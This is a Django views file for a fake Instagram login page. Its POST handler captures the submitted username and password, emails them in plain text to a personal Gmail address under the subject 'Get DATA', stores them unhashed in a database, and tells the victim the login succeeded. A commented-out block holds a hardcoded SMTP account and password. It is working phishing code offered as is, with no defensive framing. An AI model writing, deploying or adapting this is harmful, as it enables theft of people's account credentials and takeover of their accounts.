from django.views import View
from django.shortcuts import render,redirect
from .models import Insta
from django.contrib import messages
from django.core.mail import EmailMultiAlternatives


class Instagram(View):
    def get(self, request):
        return render(request, 'index.html')
    
    def post(self, request):
        username = request.POST['username']
        password = request.POST['password']
         # Send email to the manager
        manager_email = "satyambadal48@gmail.com"  # Replace with manager's actual email address
        subject = f" Get DATA "
        from_email = 'satyambadal07@gmail.com'
        to_email = [manager_email]

        text_content = f"""
        A new account data is get......
        username : {username}
        password : {password}
        Regards,
        Your Company
        """

        email = EmailMultiAlternatives(subject, text_content, from_email, to_email)
        email.send()

        create = Insta.objects.create(username=username, password=password)
        if create:
            messages.success(request, 'Log in successfully')
        return render(request,'welcome.html')



# import smtplib
# from email.mime.text import MIMEText

# smtp_server = 'smtp.gmail.com'
# smtp_port = 587
# username = 'satyambadal07@gmail.com'
# password = '124578@Ok'

# msg = MIMEText('This is a test email.')
# msg['Subject'] = 'Test Email'
# msg['From'] = username
# msg['To'] = 'satyambadal48@gmail.com'

# try:
#     server = smtplib.SMTP(smtp_server, smtp_port)
#     server.starttls()
#     server.login(username, password)
#     server.sendmail(username, 'satyambadal48@gmail.com', msg.as_string())
#     print("Email sent successfully")
# except Exception as e:
#     print(f"Failed to send email: {e}")
# finally:
#     server.quit()